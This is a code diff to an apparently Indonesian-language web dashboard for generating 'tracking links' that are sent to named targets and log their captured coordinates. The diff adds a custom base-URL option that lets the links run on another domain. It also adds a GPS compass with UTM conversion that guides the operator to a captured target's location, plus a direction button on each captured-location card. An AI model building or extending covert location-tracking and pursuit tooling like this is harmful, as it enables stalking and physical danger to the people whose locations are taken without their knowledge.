@@ -133,6 +133,26 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .chat-input-row{display:flex;background:var(--bg2);border-top:1px solid var(--gold-d);padding:10px;gap:8px}
 .chat-input-row input{flex:1;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:12px;padding:10px 12px;outline:none;border-radius:var(--radius)}
 .chat-input-row button{background:var(--gold);color:#000;border:none;font-family:'Courier New',monospace;font-size:11px;font-weight:bold;letter-spacing:2px;padding:0 18px;cursor:pointer;border-radius:var(--radius)}
+/* ── COMPASS (ADDED) */
+.cmp-wrap{display:flex;gap:14px;align-items:center;justify-content:center;flex-wrap:wrap}
+.cmp-dial{position:relative;width:190px;height:190px;border-radius:50%;background:radial-gradient(circle at 50% 50%,#101010 0%,#050505 70%);border:2px solid var(--gold-d);flex-shrink:0;overflow:hidden}
+.cmp-ticks{position:absolute;inset:6px;border-radius:50%;background:repeating-conic-gradient(from 0deg,rgba(200,160,0,.5) 0deg .6deg,transparent .6deg 15deg);-webkit-mask:radial-gradient(circle,transparent 62%,#000 63%);mask:radial-gradient(circle,transparent 62%,#000 63%)}
+.cmp-rose{position:absolute;inset:0;transition:transform .18s linear}
+.cmp-rose .rl{position:absolute;font-weight:bold;color:var(--text-d);font-size:13px;letter-spacing:1px}
+.cmp-rose .u{top:10px;left:50%;transform:translateX(-50%);color:var(--red)}
+.cmp-rose .s{bottom:10px;left:50%;transform:translateX(-50%)}
+.cmp-rose .t{right:12px;top:50%;transform:translateY(-50%)}
+.cmp-rose .b{left:12px;top:50%;transform:translateY(-50%)}
+.cmp-rose .d{font-size:9px;opacity:.6}
+.cmp-rose .tl{top:26px;right:30px}.cmp-rose .tg{bottom:26px;right:30px}.cmp-rose .bd{bottom:26px;left:30px}.cmp-rose .bl{top:26px;left:30px}
+.cmp-needle{position:absolute;inset:0;transition:transform .18s linear}
+.nd-up{position:absolute;top:16px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:9px solid transparent;border-right:9px solid transparent;border-bottom:64px solid var(--cyan);filter:drop-shadow(0 0 6px rgba(0,212,255,.7))}
+.nd-dn{position:absolute;bottom:16px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:9px solid transparent;border-right:9px solid transparent;border-top:64px solid #333}
+.cmp-cap{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;border-radius:50%;background:var(--gold);border:2px solid #000;z-index:3}
+.cmp-topmark{position:absolute;top:2px;left:50%;transform:translateX(-50%);color:var(--gold);font-size:12px;z-index:4}
+.cmp-read{text-align:center;min-width:120px}
+.cmp-dist{font-size:30px;font-weight:bold;color:var(--gold);letter-spacing:1px}
+.cmp-sub{font-size:11px;color:var(--cyan);margin-top:4px;letter-spacing:2px}
 </style>
 </head>
 <body>
@@ -206,7 +226,10 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 <div class="term-body">
   <div class="prompt">[Generate] Tracking Link</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div>
-  <input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()">
+  <input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off">
+  <div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div>
+  <input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" autocapitalize="off" spellcheck="false">
+  <div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div>
   <div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link:</div>
   <div style="display:flex;gap:8px">
     <button class="term-btn" onclick="genLink()" style="margin:0">[ Track Link ]</button>
@@ -284,6 +307,59 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 <div class="term-body">
   <div class="prompt">[System] Log</div>
   <div id="logBox"><div class="log-line">Initializing...</div></div>
+</div>
+
+<!-- COMPASS (ADDED) -->
+<div class="term-body" id="compassPanel">
+  <div class="prompt">[Nav] Kompas Target</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">› isi koordinat tujuan, klik MULAI, ikuti jarum + jarak.</div>
+  <div style="display:flex;gap:8px;margin-bottom:10px">
+    <button class="term-btn outline" id="cmpModeKoord" onclick="setCompassMode('koordinat')" style="margin:0">[ Koordinat ]</button>
+    <button class="term-btn outline" id="cmpModeUtm" onclick="setCompassMode('utm')" style="margin:0">[ UTM ]</button>
+  </div>
+  <div id="cmpRowKord">
+    <div class="geo-row">
+      <input id="cmpLat" class="geo-inp" placeholder="Latitude (-6.2...)" type="number" step="any">
+      <input id="cmpLng" class="geo-inp" placeholder="Longitude (106.8...)" type="number" step="any">
+    </div>
+  </div>
+  <div id="cmpRowUtm" style="display:none">
+    <div class="geo-row">
+      <input id="cmpZone" class="geo-inp" placeholder="Zona (49)" type="number" style="max-width:80px">
+      <select id="cmpHemi" class="geo-inp" style="max-width:64px"><option value="S">S</option><option value="N">N</option></select>
+      <input id="cmpEast" class="geo-inp" placeholder="Easting" type="number" step="any">
+      <input id="cmpNorth" class="geo-inp" placeholder="Northing" type="number" step="any">
+    </div>
+  </div>
+  <div style="display:flex;gap:8px;margin-bottom:10px">
+    <button class="term-btn" onclick="startCompass()" style="margin:0">[ Mulai ]</button>
+    <button class="term-btn danger" onclick="stopCompass()" style="margin:0;flex:0 0 auto;width:auto;padding:0 18px">[ Stop ]</button>
+  </div>
+  <button class="term-btn outline" onclick="compassLatest()" style="margin:0 0 12px">[ Pakai Target Terbaru ]</button>
+  <div class="cmp-wrap">
+    <div class="cmp-dial">
+      <div class="cmp-ticks"></div>
+      <div class="cmp-rose" id="cmpRose">
+        <span class="rl u">U</span><span class="rl t">T</span><span class="rl s">S</span><span class="rl b">B</span>
+        <span class="rl d tl">TL</span><span class="rl d tg">TG</span><span class="rl d bd">BD</span><span class="rl d bl">BL</span>
+      </div>
+      <div class="cmp-needle" id="cmpNeedle"><div class="nd-up"></div><div class="nd-dn"></div></div>
+      <div class="cmp-cap"></div>
+      <div class="cmp-topmark">▲</div>
+    </div>
+    <div class="cmp-read">
+      <div class="cmp-dist" id="cmpDist">--</div>
+      <div class="cmp-sub" id="cmpBear">BEARING --</div>
+    </div>
+  </div>
+  <div class="term-info" style="margin-top:12px">
+    <div><span class="k">TUJUAN</span><span class="v" id="cmpTarget">-</span></div>
+    <div><span class="k">POSISI</span><span class="v" id="cmpPos">-</span></div>
+    <div><span class="k">POSISI UTM</span><span class="v" id="cmpUtm">-</span></div>
+    <div><span class="k">AKURASI</span><span class="v" id="cmpAcc">-</span></div>
+    <div><span class="k">HEADING</span><span class="v" id="cmpHead">-</span></div>
+  </div>
+  <div class="geo-status" id="cmpStatus" style="margin-top:10px;margin-bottom:0">Siap — isi tujuan lalu MULAI</div>
 </div>
 </div>
 
@@ -596,11 +672,15 @@ window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=
 
 // GENERATE LINK
 let currentLink='';
-window.genLink=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (TRACK):';addLog('Link track: '+t);beep(900,.08)};
+// -- ADDED: BASE URL CUSTOM --
+function linkBase(){let c='';try{c=(document.getElementById('baseUrlCustom').value||'').trim()}catch(e){}c=c.replace(/\/+$/,'');if(!c)return location.origin;if(!/^[a-z]+:\/\//i.test(c))c='https://'+c;return c}
+function saveBase(){try{localStorage.setItem('baseUrlCustom_'+user,(document.getElementById('baseUrlCustom').value||'').trim())}catch(e){}}
+(function(){try{const s=localStorage.getItem('baseUrlCustom_'+user)||'';const el=document.getElementById('baseUrlCustom');if(el&&s)el.value=s}catch(e){}})();
+window.genLink=()=>{playKlik();saveBase();const t=document.getElementById('targetName').value.trim()||'target';const u=linkBase()+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (TRACK):';addLog('Link track: '+t);beep(900,.08)};
 window.copyLink=async()=>{if(!currentLink)return;try{await navigator.clipboard.writeText(currentLink);document.getElementById('btnCopy').innerText='[ ✓ Tersalin ]';setTimeout(()=>document.getElementById('btnCopy').innerText='[ 📋 Salin Link ]',2000)}catch(e){}};
 
 // ── ADDED: GENERATE MAPS LINK (hasil tampil di kotak link bersama) ──
-window.genLinkMaps=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (MAPS):';addLog('Link maps: '+t);beep(900,.08)};
+window.genLinkMaps=()=>{playKlik();saveBase();const t=document.getElementById('targetName').value.trim()||'target';const u=linkBase()+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (MAPS):';addLog('Link maps: '+t);beep(900,.08)};
 
 // DATA
 let allData=[],lastCnt=0,firstLoad=true;
@@ -650,6 +730,7 @@ function renderData(){
       <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
       <div class="card-actions">
         <button onclick="saveNote('${key}')">📝 NOTE</button>
+        <button onclick="goCompass(${d.lat},${d.lng})">➤ ARAH</button>
         <button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button>
         <button onclick="downloadCard('${key}')">📥 SAVE</button>
         <button class="del" onclick="deleteItem('${key}')">🗑️ DEL</button>
@@ -680,6 +761,202 @@ onValue(ref(db,'lokasi/'+user),snap=>{
   lastCnt=allData.length;firstLoad=false;renderData();
 });
 
+// ══════════════════════════
+// COMPASS NAVIGASI (ADDED)
+// ══════════════════════════
+let compassMode='koordinat',cmpActive=false,cmpTarget=null,cmpPos=null,cmpHeadSensor=null,cmpWatch=null,cmpOriHandler=null,cmpArrived=false;
+
+window.setCompassMode=(m)=>{
+  compassMode=m;
+  document.getElementById('cmpRowKord').style.display=m==='koordinat'?'block':'none';
+  document.getElementById('cmpRowUtm').style.display=m==='utm'?'block':'none';
+  document.getElementById('cmpModeKoord').style.background=m==='koordinat'?'rgba(200,160,0,.15)':'';
+  document.getElementById('cmpModeUtm').style.background=m==='utm'?'rgba(200,160,0,.15)':'';
+};
+
+function utmToLatLng(zone,hemi,easting,northing){
+  zone=Number(zone);easting=Number(easting);northing=Number(northing);
+  if(!Number.isFinite(zone)||zone<1||zone>60||!Number.isFinite(easting)||!Number.isFinite(northing))return null;
+  const a=6378137,f=1/298.257223563,k0=0.9996;
+  const e2=f*(2-f),e4=e2*e2,e6=e4*e2;
+  const e1=(1-Math.sqrt(1-e2))/(1+Math.sqrt(1-e2));
+  let y=northing;
+  if(String(hemi||'S').toUpperCase()==='S')y=northing-10000000;
+  const m=y/k0;
+  const mu=m/(a*(1-e2/4-3*e4/64-5*e6/256));
+  const p1=mu+(3*e1/2-27*Math.pow(e1,3)/32)*Math.sin(2*mu)+(21*e1*e1/16-55*Math.pow(e1,4)/32)*Math.sin(4*mu)+(151*Math.pow(e1,3)/96)*Math.sin(6*mu)+(1097*Math.pow(e1,4)/512)*Math.sin(8*mu);
+  const n1=a/Math.sqrt(1-e2*Math.sin(p1)*Math.sin(p1));
+  const t1=Math.tan(p1)*Math.tan(p1);
+  const c1=e2/(1-e2)*Math.cos(p1)*Math.cos(p1);
+  const r1=a*(1-e2)/Math.pow(1-e2*Math.sin(p1)*Math.sin(p1),1.5);
+  const d=(easting-500000)/(n1*k0);
+  let lat=p1-(n1*Math.tan(p1)/r1)*(d*d/2-(5+3*t1+10*c1-4*c1*c1-9*e2)*Math.pow(d,4)/24+(61+90*t1+298*c1+45*t1*t1-252*e2-3*c1*c1)*Math.pow(d,6)/720);
+  lat=lat*180/Math.PI;
+  let lng=(d-(1+2*t1+c1)*Math.pow(d,3)/6+(5-2*c1+28*t1-3*c1*c1+8*e2+24*t1*t1)*Math.pow(d,5)/120)/Math.cos(p1);
+  lng=((zone-1)*6-180+3)+lng*180/Math.PI;
+  if(Math.abs(lat)>90||Math.abs(lng)>180)return null;
+  return {lat:lat,lng:lng};
+}
+
+function latLngToUtm(lat,lng){
+  const a=6378137,f=1/298.257223563,k0=0.9996;
+  const e2=f*(2-f),e4=e2*e2,e6=e4*e2;
+  const zone=Math.floor((lng+180)/6)+1;
+  const lon0=(zone-1)*6-180+3;
+  const la=lat*Math.PI/180,lo=lng*Math.PI/180,l0=lon0*Math.PI/180;
+  const n=a/Math.sqrt(1-e2*Math.sin(la)*Math.sin(la));
+  const t=Math.tan(la)*Math.tan(la);
+  const c=e2/(1-e2)*Math.cos(la)*Math.cos(la);
+  const A=Math.cos(la)*(lo-l0);
+  const M=a*((1-e2/4-3*e4/64-5*e6/256)*la-(3*e2/8+3*e4/32+45*e6/1024)*Math.sin(2*la)+(15*e4/256+45*e6/1024)*Math.sin(4*la)-(35*e6/3072)*Math.sin(6*la));
+  const E=k0*n*(A+(1-t+c)*Math.pow(A,3)/6+(5-18*t+t*t+72*c-58*e2)*Math.pow(A,5)/120)+500000;
+  let N=k0*(M+n*Math.tan(la)*(A*A/2+(5-t+9*c+4*c*c)*Math.pow(A,4)/24+(61-58*t+t*t+600*c-330*e2)*Math.pow(A,6)/720));
+  const hemi=lat<0?'S':'N';
+  if(lat<0)N+=10000000;
+  return {zone:zone,hemi:hemi,easting:Math.round(E),northing:Math.round(N)};
+}
+
+function bearingTo(la1,lo1,la2,lo2){
+  const p=Math.PI/180;
+  const dLo=(lo2-lo1)*p;
+  const y=Math.sin(dLo)*Math.cos(la2*p);
+  const x=Math.cos(la1*p)*Math.sin(la2*p)-Math.sin(la1*p)*Math.cos(la2*p)*Math.cos(dLo);
+  return (Math.atan2(y,x)/p+360)%360;
+}
+
+function wind16(b){return ['U','UTL','TL','TTL','T','TTG','TG','STG','S','SBD','BD','BBD','B','BBL','BL','UBL'][Math.round(b/22.5)%16]}
+
+function cmpStatus(t){const el=document.getElementById('cmpStatus');if(el)el.innerText=t}
+
+function onCmpOrient(e){
+  try{
+    let h=null;
+    if(e.webkitCompassHeading!=null&&isFinite(e.webkitCompassHeading))h=e.webkitCompassHeading;
+    else if(e.alpha!=null&&isFinite(e.alpha))h=(360-e.alpha)%360;
+    if(h!=null&&isFinite(h)){cmpHeadSensor=h;if(cmpActive)updateCompass()}
+  }catch(err){}
+}
+
+window.startCompass=async()=>{
+  playKlik();
+  let t=null;
+  const g=id=>{try{return document.getElementById(id).value}catch(e){return''}};
+  if(compassMode==='utm'){
+    const r=utmToLatLng(g('cmpZone'),g('cmpHemi'),g('cmpEast'),g('cmpNorth'));
+    if(!r){addLog('UTM tidak valid','err');alert('UTM tidak valid.\nZona 1-60, Easting & Northing harus angka.');return}
+    const u=latLngToUtm(r.lat,r.lng);
+    t={lat:r.lat,lng:r.lng,label:'UTM '+u.zone+u.hemi+' '+u.easting+' '+u.northing};
+  }else{
+    const la=parseFloat(g('cmpLat')),ln=parseFloat(g('cmpLng'));
+    if(!Number.isFinite(la)||!Number.isFinite(ln)||Math.abs(la)>90||Math.abs(ln)>180){addLog('Koordinat tidak valid','err');alert('Isi Latitude (-90..90) dan Longitude (-180..180).');return}
+    const u=latLngToUtm(la,ln);
+    t={lat:la,lng:ln,label:la.toFixed(5)+', '+ln.toFixed(5)+' (UTM '+u.zone+u.hemi+')'};
+  }
+  cmpTarget=t;
+  try{localStorage.setItem('compassTarget_'+user,JSON.stringify({mode:compassMode,lat:g('cmpLat'),lng:g('cmpLng'),zone:g('cmpZone'),hemi:g('cmpHemi'),east:g('cmpEast'),north:g('cmpNorth')}))}catch(e){}
+  if(!navigator.geolocation){alert('Browser tidak mendukung GPS');return}
+  try{
+    if(typeof DeviceOrientationEvent!=='undefined'&&typeof DeviceOrientationEvent.requestPermission==='function'){await DeviceOrientationEvent.requestPermission()}
+  }catch(e){}
+  stopCompassSilent();
+  cmpActive=true;cmpArrived=false;cmpHeadSensor=null;
+  document.getElementById('cmpTarget').innerText=t.label;
+  cmpStatus('Mencari GPS...');
+  addLog('Kompas mulai: '+t.label);
+  try{
+    cmpOriHandler=e=>onCmpOrient(e);
+    window.addEventListener('deviceorientation',cmpOriHandler,true);
+  }catch(e){}
+  try{
+    cmpWatch=navigator.geolocation.watchPosition(
+      pos=>{cmpPos={lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy,head:pos.coords.heading,speed:pos.coords.speed||0};updateCompass()},
+      err=>{cmpStatus('GPS error: '+(err.message||err.code));addLog('Kompas GPS error','err')},
+      {enableHighAccuracy:true,timeout:15000,maximumAge:2000}
+    );
+  }catch(e){cmpStatus('GPS tidak tersedia');return}
+};
+
+function stopCompassSilent(){
+  cmpActive=false;
+  try{if(cmpWatch!=null)navigator.geolocation.clearWatch(cmpWatch)}catch(e){}
+  cmpWatch=null;
+  try{if(cmpOriHandler)window.removeEventListener('deviceorientation',cmpOriHandler,true)}catch(e){}
+  cmpOriHandler=null;
+}
+window.stopCompass=()=>{playKlik();stopCompassSilent();cmpStatus('Berhenti');addLog('Kompas berhenti')};
+
+function fmtDist(m){
+  if(!isFinite(m))return '-';
+  if(m<1000)return Math.round(m)+' m';
+  if(m<10000)return (m/1000).toFixed(2)+' km';
+  return (m/1000).toFixed(1)+' km';
+}
+
+function updateCompass(){
+  if(!cmpActive||!cmpTarget||!cmpPos)return;
+  const dist=haversine(cmpPos.lat,cmpPos.lng,cmpTarget.lat,cmpTarget.lng);
+  const bear=bearingTo(cmpPos.lat,cmpPos.lng,cmpTarget.lat,cmpTarget.lng);
+  let head=null,src='';
+  if(cmpPos.head!=null&&isFinite(cmpPos.head)&&cmpPos.speed>1.5){head=cmpPos.head;src='GPS'}
+  else if(cmpHeadSensor!=null){head=cmpHeadSensor;src='sensor'}
+  const rose=document.getElementById('cmpRose'),needle=document.getElementById('cmpNeedle');
+  if(rose&&needle){
+    if(head!=null){rose.style.transform='rotate('+(-head)+'deg)';needle.style.transform='rotate('+(bear-head)+'deg)'}
+    else{rose.style.transform='rotate(0deg)';needle.style.transform='rotate('+bear+'deg)'}
+  }
+  document.getElementById('cmpDist').innerText=fmtDist(dist);
+  document.getElementById('cmpBear').innerText='BEARING '+String(Math.round(bear)).padStart(3,'0')+'° '+wind16(bear);
+  document.getElementById('cmpPos').innerText=cmpPos.lat.toFixed(6)+', '+cmpPos.lng.toFixed(6);
+  try{
+    const u=latLngToUtm(cmpPos.lat,cmpPos.lng);
+    document.getElementById('cmpUtm').innerText=u.zone+u.hemi+'  E '+u.easting+'  N '+u.northing;
+  }catch(e){}
+  document.getElementById('cmpAcc').innerText=(cmpPos.acc!=null?'±'+Math.round(cmpPos.acc)+' m':'-');
+  document.getElementById('cmpHead').innerText=head!=null?(Math.round(head)+'° ('+src+')'):'kalibrasi — gerakkan HP';
+  if(dist<=25){
+    cmpStatus('◉ SAMPAI DI LOKASI TUJUAN');
+    if(!cmpArrived){cmpArrived=true;try{geoSound();ucapkan('Sampai di lokasi tujuan')}catch(e){}}
+  }else{
+    if(dist>60)cmpArrived=false;
+    cmpStatus(head!=null?'LOCKED — ikuti jarum cyan':'LOCKED — arah kompas belum kalibrasi');
+  }
+}
+
+window.compassLatest=()=>{
+  playKlik();
+  const f=allData.find(([,d])=>d.lat&&d.lng);
+  if(!f){addLog('Belum ada target berkoordinat','err');return}
+  setCompassMode('koordinat');
+  document.getElementById('cmpLat').value=Number(f[1].lat).toFixed(6);
+  document.getElementById('cmpLng').value=Number(f[1].lng).toFixed(6);
+  addLog('Kompas target: '+(f[1].target||''));
+  startCompass();
+};
+
+window.goCompass=(lat,lng)=>{
+  playKlik();
+  if(lat==null||lng==null){addLog('Tidak ada koordinat','err');return}
+  lat=Number(lat);lng=Number(lng);
+  if(!Number.isFinite(lat)||!Number.isFinite(lng)){addLog('Tidak ada koordinat','err');return}
+  setCompassMode('koordinat');
+  document.getElementById('cmpLat').value=lat.toFixed(6);
+  document.getElementById('cmpLng').value=lng.toFixed(6);
+  try{document.getElementById('compassPanel').scrollIntoView({behavior:'smooth'})}catch(e){}
+  startCompass();
+};
+
+(function(){
+  let m='koordinat';
+  try{
+    const s=JSON.parse(localStorage.getItem('compassTarget_'+user)||'null');
+    if(s){
+      const set=(id,v)=>{if(v!==undefined&&v!==null&&v!==''){const el=document.getElementById(id);if(el)el.value=v}};
+      set('cmpLat',s.lat);set('cmpLng',s.lng);set('cmpZone',s.zone);set('cmpHemi',s.hemi);set('cmpEast',s.east);set('cmpNorth',s.north);
+      if(s.mode)m=s.mode;
+    }
+  }catch(e){}
+  setCompassMode(m);
+})();
 
 // ══════════════════════════
 // CHAT
